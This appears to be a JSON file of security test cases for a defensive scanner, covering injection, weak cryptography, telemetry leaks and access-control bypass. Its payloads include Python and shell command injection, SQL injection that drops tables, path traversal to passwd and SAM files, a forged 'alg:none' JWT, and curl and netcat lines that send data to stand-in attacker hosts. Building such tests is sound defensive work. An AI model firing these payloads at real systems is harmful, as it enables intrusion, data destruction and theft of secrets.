[
  {
    "test_id": "injection_test_1",
    "name": "Injection Test 1",
    "description": "Test for injection vulnerability with payload: __import__('os').system('id')...",
    "attack_type": "code_injection",
    "category": "a03_injection",
    "severity": "critical",
    "target_component": "user_input_handlers",
    "test_payload": "__import__('os').system('id')",
    "expected_outcome": "Input should be sanitized and payload rejected",
    "remediation_hint": "Implement input validation and parameterized queries"
  },
  {
    "test_id": "injection_test_2",
    "name": "Injection Test 2",
    "description": "Test for injection vulnerability with payload: eval('__import__(\"os\").system(\"whoami\")')...",
    "attack_type": "code_injection",
    "category": "a03_injection",
    "severity": "critical",
    "target_component": "user_input_handlers",
    "test_payload": "eval('__import__(\"os\").system(\"whoami\")')",
    "expected_outcome": "Input should be sanitized and payload rejected",
    "remediation_hint": "Implement input validation and parameterized queries"
  },
  {
    "test_id": "injection_test_3",
    "name": "Injection Test 3",
    "description": "Test for injection vulnerability with payload: exec('import subprocess; subprocess.call([\"ls\"])')...",
    "attack_type": "code_injection",
    "category": "a03_injection",
    "severity": "critical",
    "target_component": "user_input_handlers",
    "test_payload": "exec('import subprocess; subprocess.call([\"ls\"])')",
    "expected_outcome": "Input should be sanitized and payload rejected",
    "remediation_hint": "Implement input validation and parameterized queries"
  },
  {
    "test_id": "injection_test_4",
    "name": "Injection Test 4",
    "description": "Test for injection vulnerability with payload: '; DROP TABLE users; --...",
    "attack_type": "code_injection",
    "category": "a03_injection",
    "severity": "critical",
    "target_component": "user_input_handlers",
    "test_payload": "'; DROP TABLE users; --",
    "expected_outcome": "Input should be sanitized and payload rejected",
    "remediation_hint": "Implement input validation and parameterized queries"
  },
  {
    "test_id": "injection_test_5",
    "name": "Injection Test 5",
    "description": "Test for injection vulnerability with payload: ' OR '1'='1...",
    "attack_type": "code_injection",
    "category": "a03_injection",
    "severity": "critical",
    "target_component": "user_input_handlers",
    "test_payload": "' OR '1'='1",
    "expected_outcome": "Input should be sanitized and payload rejected",
    "remediation_hint": "Implement input validation and parameterized queries"
  },
  {
    "test_id": "injection_test_6",
    "name": "Injection Test 6",
    "description": "Test for injection vulnerability with payload: ' UNION SELECT * FROM sensitive_data --...",
    "attack_type": "code_injection",
    "category": "a03_injection",
    "severity": "critical",
    "target_component": "user_input_handlers",
    "test_payload": "' UNION SELECT * FROM sensitive_data --",
    "expected_outcome": "Input should be sanitized and payload rejected",
    "remediation_hint": "Implement input validation and parameterized queries"
  },
  {
    "test_id": "injection_test_7",
    "name": "Injection Test 7",
    "description": "Test for injection vulnerability with payload: ; cat /etc/passwd...",
    "attack_type": "code_injection",
    "category": "a03_injection",
    "severity": "critical",
    "target_component": "user_input_handlers",
    "test_payload": "; cat /etc/passwd",
    "expected_outcome": "Input should be sanitized and payload rejected",
    "remediation_hint": "Implement input validation and parameterized queries"
  },
  {
    "test_id": "injection_test_8",
    "name": "Injection Test 8",
    "description": "Test for injection vulnerability with payload: | nc attacker.com 4444...",
    "attack_type": "code_injection",
    "category": "a03_injection",
    "severity": "critical",
    "target_component": "user_input_handlers",
    "test_payload": "| nc attacker.com 4444",
    "expected_outcome": "Input should be sanitized and payload rejected",
    "remediation_hint": "Implement input validation and parameterized queries"
  },
  {
    "test_id": "injection_test_9",
    "name": "Injection Test 9",
    "description": "Test for injection vulnerability with payload: && curl http://evil.com/steal?data=$(cat secret.tx...",
    "attack_type": "code_injection",
    "category": "a03_injection",
    "severity": "critical",
    "target_component": "user_input_handlers",
    "test_payload": "&& curl http://evil.com/steal?data=$(cat secret.txt)",
    "expected_outcome": "Input should be sanitized and payload rejected",
    "remediation_hint": "Implement input validation and parameterized queries"
  },
  {
    "test_id": "injection_test_10",
    "name": "Injection Test 10",
    "description": "Test for injection vulnerability with payload: ../../../etc/passwd...",
    "attack_type": "code_injection",
    "category": "a03_injection",
    "severity": "critical",
    "target_component": "user_input_handlers",
    "test_payload": "../../../etc/passwd",
    "expected_outcome": "Input should be sanitized and payload rejected",
    "remediation_hint": "Implement input validation and parameterized queries"
  },
  {
    "test_id": "injection_test_11",
    "name": "Injection Test 11",
    "description": "Test for injection vulnerability with payload: ..\\..\\..\\windows\\system32\\config\\sam...",
    "attack_type": "code_injection",
    "category": "a03_injection",
    "severity": "critical",
    "target_component": "user_input_handlers",
    "test_payload": "..\\..\\..\\windows\\system32\\config\\sam",
    "expected_outcome": "Input should be sanitized and payload rejected",
    "remediation_hint": "Implement input validation and parameterized queries"
  },
  {
    "test_id": "injection_test_12",
    "name": "Injection Test 12",
    "description": "Test for injection vulnerability with payload: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd...",
    "attack_type": "code_injection",
    "category": "a03_injection",
    "severity": "critical",
    "target_component": "user_input_handlers",
    "test_payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "expected_outcome": "Input should be sanitized and payload rejected",
    "remediation_hint": "Implement input validation and parameterized queries"
  },
  {
    "test_id": "crypto_test_1",
    "name": "Weak Key Generation Test",
    "description": "Test for predictable key generation with fixed seed",
    "attack_type": "cryptographic",
    "category": "a02_cryptographic_failures",
    "severity": "high",
    "target_component": "cryptographic_functions",
    "test_payload": "generate_key(seed=12345)",
    "expected_outcome": "Cryptographic operations should be secure",
    "remediation_hint": "Use cryptographically secure random number generators"
  },
  {
    "test_id": "crypto_test_2",
    "name": "Hash Collision Test",
    "description": "Test MD5 hash collision vulnerability",
    "attack_type": "cryptographic",
    "category": "a02_cryptographic_failures",
    "severity": "high",
    "target_component": "cryptographic_functions",
    "test_payload": "md5_hash_collision_attack",
    "expected_outcome": "Cryptographic operations should be secure",
    "remediation_hint": "Use SHA-256 or stronger hash functions"
  },
  {
    "test_id": "crypto_test_3",
    "name": "Timing Attack Test",
    "description": "Test for timing side-channel vulnerabilities",
    "attack_type": "cryptographic",
    "category": "a02_cryptographic_failures",
    "severity": "high",
    "target_component": "cryptographic_functions",
    "test_payload": "constant_time_comparison_test",
    "expected_outcome": "Cryptographic operations should be secure",
    "remediation_hint": "Use constant-time comparison functions"
  },
  {
    "test_id": "crypto_test_4",
    "name": "Weak Random Test",
    "description": "Test for use of non-cryptographic random",
    "attack_type": "cryptographic",
    "category": "a02_cryptographic_failures",
    "severity": "high",
    "target_component": "cryptographic_functions",
    "test_payload": "random.random() for key generation",
    "expected_outcome": "Cryptographic operations should be secure",
    "remediation_hint": "Use secrets.SystemRandom() for cryptographic purposes"
  },
  {
    "test_id": "telemetry_test_1",
    "name": "Telemetry Data Leak Test 1",
    "description": "Test for sensitive data exposure in telemetry: password=secret123&log=true...",
    "attack_type": "telemetry_leak",
    "category": "a09_logging_monitoring_failures",
    "severity": "high",
    "target_component": "telemetry_exporters",
    "test_payload": "password=secret123&log=true",
    "expected_outcome": "Sensitive data should be filtered from telemetry",
    "remediation_hint": "Implement data sanitization before telemetry export"
  },
  {
    "test_id": "telemetry_test_2",
    "name": "Telemetry Data Leak Test 2",
    "description": "Test for sensitive data exposure in telemetry: api_key=sk-1234567890abcdef&tr...",
    "attack_type": "telemetry_leak",
    "category": "a09_logging_monitoring_failures",
    "severity": "high",
    "target_component": "telemetry_exporters",
    "test_payload": "api_key=sk-1234567890abcdef&trace=enabled",
    "expected_outcome": "Sensitive data should be filtered from telemetry",
    "remediation_hint": "Implement data sanitization before telemetry export"
  },
  {
    "test_id": "telemetry_test_3",
    "name": "Telemetry Data Leak Test 3",
    "description": "Test for sensitive data exposure in telemetry: credit_card=4111111111111111&m...",
    "attack_type": "telemetry_leak",
    "category": "a09_logging_monitoring_failures",
    "severity": "high",
    "target_component": "telemetry_exporters",
    "test_payload": "credit_card=4111111111111111&metrics=on",
    "expected_outcome": "Sensitive data should be filtered from telemetry",
    "remediation_hint": "Implement data sanitization before telemetry export"
  },
  {
    "test_id": "telemetry_test_4",
    "name": "Telemetry Data Leak Test 4",
    "description": "Test for sensitive data exposure in telemetry: ssn=123-45-6789&export=jaeger...",
    "attack_type": "telemetry_leak",
    "category": "a09_logging_monitoring_failures",
    "severity": "high",
    "target_component": "telemetry_exporters",
    "test_payload": "ssn=123-45-6789&export=jaeger",
    "expected_outcome": "Sensitive data should be filtered from telemetry",
    "remediation_hint": "Implement data sanitization before telemetry export"
  },
  {
    "test_id": "telemetry_test_5",
    "name": "Telemetry Data Leak Test 5",
    "description": "Test for sensitive data exposure in telemetry: private_key=-----BEGIN RSA PRI...",
    "attack_type": "telemetry_leak",
    "category": "a09_logging_monitoring_failures",
    "severity": "high",
    "target_component": "telemetry_exporters",
    "test_payload": "private_key=-----BEGIN RSA PRIVATE KEY-----",
    "expected_outcome": "Sensitive data should be filtered from telemetry",
    "remediation_hint": "Implement data sanitization before telemetry export"
  },
  {
    "test_id": "auth_test_1",
    "name": "Privilege Escalation Test",
    "description": "Test for privilege escalation vulnerabilities",
    "attack_type": "authorization_bypass",
    "category": "a01_broken_access_control",
    "severity": "high",
    "target_component": "authentication_system",
    "test_payload": "user_role=admin&bypass_check=true",
    "expected_outcome": "Authorization checks should prevent access",
    "remediation_hint": "Implement proper authorization validation"
  },
  {
    "test_id": "auth_test_2",
    "name": "JWT Token Manipulation",
    "description": "Test for JWT token manipulation",
    "attack_type": "authorization_bypass",
    "category": "a01_broken_access_control",
    "severity": "high",
    "target_component": "authentication_system",
    "test_payload": "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
    "expected_outcome": "Authorization checks should prevent access",
    "remediation_hint": "Implement proper authorization validation"
  },
  {
    "test_id": "auth_test_3",
    "name": "Session Fixation Test",
    "description": "Test for session fixation vulnerabilities",
    "attack_type": "authorization_bypass",
    "category": "a01_broken_access_control",
    "severity": "high",
    "target_component": "authentication_system",
    "test_payload": "session_id=fixed_session_123",
    "expected_outcome": "Authorization checks should prevent access",
    "remediation_hint": "Implement proper authorization validation"
  }
]